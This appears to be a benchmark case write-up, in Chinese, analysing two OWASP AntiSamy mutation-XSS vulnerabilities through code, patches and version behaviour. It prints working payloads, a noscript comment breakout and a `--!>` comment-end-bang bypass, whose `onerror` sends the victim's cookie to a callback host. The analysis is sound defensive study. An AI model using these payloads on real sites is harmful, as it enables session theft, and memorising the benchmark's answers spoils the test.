# AntiSamy：noscript 注释被关掉了，`--!>` 仍按「一条注释」原样吐出

- Case：`PCBV2-0053`
- 产品：OWASP AntiSamy（Java HTML 消毒库）。本 case Maven 构建整包 1.7.3 / 1.7.4 / 1.7.5，HTTP `/?html=` 把 `AntiSamy.scan(..., DOM).getCleanHTML()` 嵌进页面；Selenium Chromium 带 flag cookie 执行任何漏网的 `onerror`。
- 链：CVE-2023-43643（1.7.3 → 1.7.4，GHSA-pcf2-gh6g-h5r2，neko-htmlunit 3.1.0 → 3.6.0，关掉 noscript 原文解析）→ CVE-2024-23635（1.7.5，GHSA-2mrq-w8pv-5pvq，neko 3.11.1，HTML5 comment-end-bang）
- 源码对着 GitHub tag `v1.7.4` 的 `AntiSamyDOMScanner.java`：`getDomParser`、`processCommentNode`。策略文件 `antisamy.xml` 开着 `preserveComments=true`。运行时是 Maven Central 整包，不是抽出来的函数。

AntiSamy 把不可信 HTML 解析成 DOM，按策略剥标签，再序列化成「干净」HTML 给浏览器。1.7.4 修的是 noscript / textarea / xmp 这种 raw-text 元素里用注释提前闭合、把 `<img onerror>` 漏成活节点。GHSA-2mrq 写明下一次仍要 `preserveComments`：解析器把 `--!>` 当成注释内容，浏览器把 `--!>` 当成注释结束，于是注释里没消毒的标签在页面上执行。

根因不只是「漏了一种注释写法」。检查改的是 **neko 怎么切 noscript**；真正把危险字节送进浏览器的是 **`preserveComments` 时原样序列化 Comment 节点**。下面按 `scan()` 走进去、1.7.4 改了哪处特征、序列化谁消费注释文本、策略里有没有更强却没挂上的开关，把这几层写完。

---

## 这块功能本来在干什么

站点把用户 HTML 交给 AntiSamy，再把返回值嵌进自己的页面。一次典型调用（本 case `App.java`）：

```java
Policy policy = Policy.getInstance("antisamy.xml");  // preserveComments=true
CleanResults cr = new AntiSamy().scan(html, policy, AntiSamy.DOM);
String clean = cr.getCleanHTML();
```

DOM 扫描器先用 Neko HTML 解析成片段，再 `recursiveValidateTag`。遇到 `Comment` 就进 `processCommentNode`。设计意图：允许「看起来像注释」的文本留下（例如条件注释之外的普通注释），同时不允许注释变成活的 HTML。成功穿越之后的效果是：**浏览器执行了 sanitizer 输出里的 `onerror`，cookie 里的 flag 被带到 callback**。oracle 看的是执行，不是反射。

数据流：

```text
HTTP ?html=
    → AntiSamy.scan(html, policy, DOM)
         Neko DOMFragmentParser
              V1：parse-noscript-content=false
              注释：neko 3.6.0 把 <!-- ... --!> ... --> 合成一个 Comment
         recursiveValidateTag
              Comment → processCommentNode
                   preserveComments? 去掉条件指令，data 原样留下
         ASHTMLSerializer / MagicSAXFilter 吐 clean HTML
    → 嵌入页面
    → Chromium HTML5 解析
         --!> 走 comment end bang → 注释结束
         后面的 <img onerror> 成活节点
    → callback 收到 session=<flag>
```

没有登录。判断完全信任「Neko 切出来的注释节点内部已经是注释」，不信任浏览器会在另一套规则下提前结束注释。

---

## 原始漏洞：noscript 里的注释提前闭合（CVE-2023-43643，AntiSamy 1.7.3）

1.7.3 搭配 neko-htmlunit 3.1.0。`<noscript>` 在 HTML 里是 raw text：里面的 `</noscript>` 才会结束这段。若解析器在注释里就认结束标签，后面的 `<img>` 会作为兄弟元素走进 DOM，策略若允许 `img` 但剥事件，或者事件没剥干净，就会留下可执行属性。

seed（case.json / original_poc，**observed**）：

```html
<div><noscript><!--</noscript><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie">--></div>
```

neko 3.1.0 在注释里看到 `</noscript>`，raw-text 区域被关掉，`<img onerror>` 成为活元素进入扫描。1.7.3 的策略允许 img，onerror 活着走出 `getCleanHTML()`。受害者浏览器执行，callback 拿到 flag。这就是 v0 + `--seed` 退出码 0。

GHSA-pcf2：要同时开 `preserveComments` 并允许某些标签。1.7.4 的修法是让解析器不再把 noscript 当普通 DOM 去「看见」里面的结束标签。

---

## 维护者改了什么（CVE-2023-43643 修复，1.7.4）

tag `v1.7.4` 的 `AntiSamyDOMScanner.getDomParser`（约 L221–230）：

```java
static DOMFragmentParser getDomParser()
        throws SAXNotRecognizedException, SAXNotSupportedException {
    DOMFragmentParser parser = new DOMFragmentParser();
    parser.setProperty("http://cyberneko.org/html/properties/names/elems", "lower");

    parser.setFeature("http://cyberneko.org/html/features/scanner/style/strip-cdata-delims", false);
    parser.setFeature("http://cyberneko.org/html/features/scanner/cdata-sections", true);
    parser.setFeature("http://cyberneko.org/html/features/parse-noscript-content", false);

    return parser;
}
```

`parse-noscript-content=false` 让 Neko 把 noscript 当 raw text，不再在内部做 DOM 扫描。pom 把 `neko-htmlunit` 从 3.1.0 升到 3.6.0。`patch.diff` 里还有 style/CDATA、MagicSAXFilter 对 raw-text 的配套改动。

对 seed 这种「注释里写 `</noscript>`」的 breakout，它确实够用：img 不再作为活节点走出 noscript，onerror 被剥掉或整段变成文本。case.json 的 v1 矩阵记：`<div><noscript>&lt;!--</noscript><img src="x">--&gt;</div>`，onerror 消失。这就是 v1 + `--seed` 退出码 10。

注释节点本身怎么处理，1.7.4 **没改**。同一文件 `processCommentNode`（约 L738–748）：

```java
private void processCommentNode(Node node) {
    if (!policy.isPreserveComments()) {
        node.getParentNode().removeChild(node);
    } else {
        String value = ((Comment) node).getData();
        // Strip conditional directives regardless of the
        // PRESERVE_COMMENTS setting.
        if (value != null) {
            ((Comment) node).setData(conditionalDirectives.matcher(value).replaceAll(""));
        }
    }
}
```

补丁默认了两件事：

1. 危险形态长得像「raw-text 元素被内部 `</noscript>` / 注释提前结束」。
2. 只要 Neko 交给 AntiSamy 的是 Comment 节点，把 `getData()` 原样写回 HTML 注释，浏览器也会当成注释。

第二点不成立。HTML5 有 comment end bang：`--!>` 结束注释。Neko 3.6.0 仍把 `--!>` 当注释内容，直到真正的 `-->`。

---

## 消毒之后，注释文本怎么进浏览器

V1 的 `processCommentNode` 在 `preserveComments=true` 时只剥 IE 条件指令（`[if ...]` 一类），然后离开。序列化器把 Comment 的 data 包进 `<!--` … `-->` 写进 `getCleanHTML()`。

过滤器刚看过的是「这是 DOM 里的注释节点，不要当 Element 去扫 onerror」；浏览器看到的是一段字符流，按 HTML5 的 comment / comment-end-bang 状态机再切一次。两套语义中间没有第二次「注释 data 里不许出现 `--!>` / 不许出现 `<`」的谓词。cookie 能出现在 callback 上，依据就是浏览器真的执行了 `onerror`，而不是「clean HTML 里碰巧有 img 字符串」。

所以 mXSS 的形状是：

```text
Neko 3.6.0:   <!--<div/>--!><img onerror=...> <li>-->   = 一个 Comment
AntiSamy:     preserveComments → 原样输出
HTML5:        <!-- ... --!> 注释结束
              <img onerror> 活节点
              后面的 --> 变成文本或杂讯
```

序列化侧（`ASHTMLSerializer` / `MagicSAXFilter`）对 Comment 的默认行为是把 `getData()` 包进 `<!--` … `-->`。1.7.4 的 MagicSAXFilter 改动是为 raw-text / style 服务的，并不按 HTML5 再切一次 comment-end-bang。所以 DOM 里若仍是「一个注释节点」，出门的 HTML 就会把 `--!>` 和后面的 `<img>` 一起写进注释文本。浏览器再解析时，`--!>` 先结束注释，`<img>` 落到 data state。

根级注释会被 AntiSamy 丢掉，所以 payload 包在 `<div>` 里（case.json `payload_note`，**observed**）。这和真实应用把 UGC 嵌进容器是同一形状。策略文件还允许 `img`（否则漏出来的标签会被整段删除，mXSS 没有载体）。两次 CVE 的前提叠在一起：`preserveComments=true`、允许某些标签、解析器与浏览器的注释边界不一致。

---

## 仓库里已经有「不要留注释」的开关，默认策略没用

`processCommentNode` 的第一分支：`!policy.isPreserveComments()` 就删节点。GHSA-2mrq 的缓解措施原话就是：删掉 `preserveComments` 或设为 `false`。本 case 的 `antisamy.xml` 显式 `preserveComments=true`——这是产品文档里「保留注释」的合法配置，也是两次 CVE 的前提。

谁在碰注释：

| 位置 | 1.7.4 做什么 | 看 `--!>` 吗 |
|---|---|---|
| `parse-noscript-content=false` | 修 raw-text breakout | 否 |
| `processCommentNode` | 保留或删除整个节点；只剥条件指令 | **否** |
| 策略 `preserveComments` | 开着则走保留分支 | 否 |
| Neko 3.6.0 切注释 | `--!>` 不当 closer | 这才是差异 |
| 浏览器 HTML5 | `--!>` 是 closer | 效果发生在这里 |

不是没有「注释危险就丢掉」这个谓词。是 **保留注释时，没有任何「序列化结果在浏览器里仍是注释」的检查**。从 V1 的 diff 只能看到 noscript feature 和 neko 3.6.0；要判断补丁是否闭合，必须看到 `processCommentNode` 原样吐 data，以及 HTML5 comment-end-bang 与 Neko 3.6.0 的分歧。

即便没有 `--!>`，只要解析器与浏览器对「注释在哪结束」意见不一致，`preserveComments` 就会把未扫描的标签运过 sanitizer。1.7.5 升 neko 3.11.1，让解析侧对齐 HTML5。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「noscript 特征 vs 注释原样输出 vs HTML5 bang」落到具体变换。

- `parse-noscript-content=false`：看 noscript 内部还敢不敢当 DOM
- `processCommentNode`：看注释 data 原不原样
- 浏览器：看 `--!>` 是不是结束

seed：

```text
<div><noscript><!--</noscript><img onerror=...>--></div>
V0 neko 3.1.0：</noscript> 提前结束 raw-text → img 活节点 → 执行
V1 parse-noscript-content=false：onerror 被剥 → 不执行
```

held-out residual（与 1.7.5 回归测试 `testBangCommentsWhenPreservingComments` 同一构造，**observed** 于 case.json）：

```text
<div><!--<div/>--!><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie"> <li>--></p></div>

V1 Neko 3.6.0：整段一个 Comment
processCommentNode：preserveComments → 原样
浏览器：--!> 结束注释 → img 执行 → flag 到 callback
```

V1 改的是 noscript；`--!>` 这条链里根本没有 noscript 可关。注释过滤器在序列化之前运行，它看到的已经是「一个注释」，不会再按 HTML5 切第二刀。

---

## 残余仍然走同一条 `scan()` + `preserveComments` 路径（CVE-2024-23635）

没有换 API、没有换策略开关、没有换 DOM 扫描器。还是：

```text
AntiSamy.scan(html, policy, AntiSamy.DOM).getCleanHTML()
```

`processCommentNode` 仍然在 `preserveComments` 时原样留 data。V1 的 noscript feature 照样开着；这条 payload 不依赖 noscript。neko 3.6.0 把 bang 吃进注释，浏览器把 bang 当结束，callback 收到 flag。

本 case residual 写死为上述 `--!>` 向量。GHSA-2mrq：*certain crafty inputs can result in elements in comment tags being interpreted as executable when using AntiSamy's sanitized output.* 认证意图：v1 + `--residual` 在 callback 观察到 flag cookie。case.json 记一次 live 4-way differential（**observed**）：seed 在 v1 不执行，residual 在 v1 执行。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：1.7.4 只修了 raw-text 切分；保留注释等于信任解析器的 Comment 边界；Neko 3.6.0 与 HTML5 对 `--!>` 不一致。seed 被挡住只说明「noscript 注释 breakout 没了」，不说明「干净 HTML 在浏览器里不能再长出 img」。

NVD CVE-2024-23635 影响 `< 1.7.5`，缓解仍是关掉 `preserveComments`。advisory 自己说 workaround 不治 parser 根因。

---

## 后来又补了什么（CVE-2024-23635，AntiSamy 1.7.5）

1.7.5 把 `neko-htmlunit` 升到 3.11.1。GHSA-2mrq：*This is due to parsing behavior in the neko-htmlunit dependency, just by updating to a newer version the issue was solved.* case.json 还记 ASHTMLSerializer / MagicSAXFilter 对 bang-comment 的配套改动（**inferred** 自 case 材料；本文件以 GHSA 的「升 neko」为主）。

对齐之后，`--!>` 在 sanitizer 侧也会结束注释，后面的 `<img>` 作为元素走进策略，onerror 被剥。v2 上 callback 收不到 flag。公开建议是升级到 1.7.5。不能升级时，GHSA 仍建议 `preserveComments=false`。

1.7.5 的回归测试 `testBangCommentsWhenPreservingComments` 用的就是本 case residual 那种 `--!>` 形状（case.json，**observed**）。这说明维护者后来承认：保留注释时，必须让解析器的注释结束规则跟 HTML5 一致，而不能只修 noscript。

即便如此，若还有其它「解析器注释边界 ≠ 浏览器注释边界」的写法，需要另证。本 benchmark 的 v2 只关闭这一条 `--!>` residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是 noscript 要不要当 DOM 解析。真正让脚本活过来的是「Comment 原样序列化 + 浏览器另一套结束规则」。V2 才去改解析器的注释状态机。1.7.4 的 `processCommentNode` 与 1.7.3 相同。

**不是没有更强开关。**  
`preserveComments=false` 会删掉整条注释，`--!>` 无从运标签。默认策略和两次 CVE 的前提都是开着它。从 V1 只能看到 `parse-noscript-content`；要判断补丁是否闭合，必须看到注释 data 原样出门，以及 HTML5 comment-end-bang。

**同一 `scan()`、同一策略，只换了注释怎么结束。**  
任何在 Neko 里仍是一条注释、在浏览器里会提前结束的写法，在 1.7.4 + `preserveComments` 上都能把未扫描标签带出去。

**消毒器的 DOM 不是浏览器的 DOM。**  
mXSS 的定义就是两边树不一致。1.7.4 修了一种不一致（raw-text），留下了另一种（comment-end-bang）。GHSA-2mrq 把 workaround 写成关 `preserveComments`，等于承认：只要还把解析器的 Comment 原样交给浏览器，就得赌两边边界一致。

**neko 版本是守卫的一部分。**  
1.7.4 升到 3.6.0 是为了修 noscript，不是为了对齐 HTML5 注释。3.6.0 仍然把 `--!>` 当注释内容。residual 能在 V1 上活，靠的是这次升级**没有**改 comment-end-bang，而不是 AntiSamy Java 里又写了一条错误的注释谓词。

---

## 版本、入口、参考

| | AntiSamy | neko-htmlunit | noscript seed | `--!>` residual |
|---|---|---|---|---|
| V0 | 1.7.3 | 3.1.0 | img 活节点，执行，flag 到 callback | （也会执行） |
| V1 | 1.7.4 | 3.6.0 | onerror 被剥，挡 | 注释原样，浏览器执行 |
| V2 | 1.7.5 | 3.11.1 | 挡 | 挡 |

- Web：`GET /?html=`；flag 在受害者 cookie，经 `onerror` 到 callback
- 认证意图：v0 seed 执行；v1 seed 不执行；v1 residual 执行。case.json live gate（**observed**）
- [CVE-2023-43643](https://nvd.nist.gov/vuln/detail/CVE-2023-43643)、[GHSA-pcf2-gh6g-h5r2](https://github.com/nahsra/antisamy/security/advisories/GHSA-pcf2-gh6g-h5r2)
- [CVE-2024-23635](https://nvd.nist.gov/vuln/detail/CVE-2024-23635)、[GHSA-2mrq-w8pv-5pvq](https://github.com/nahsra/antisamy/security/advisories/GHSA-2mrq-w8pv-5pvq)
- 源码：[v1.7.4 AntiSamyDOMScanner.java](https://github.com/nahsra/antisamy/blob/v1.7.4/src/main/java/org/owasp/validator/html/scan/AntiSamyDOMScanner.java)（`getDomParser`、`processCommentNode`）
- V1 约 commit `45c78f1`（OSV 记 CVE-2023-43643 fixed）；V2 升 neko 3.11.1
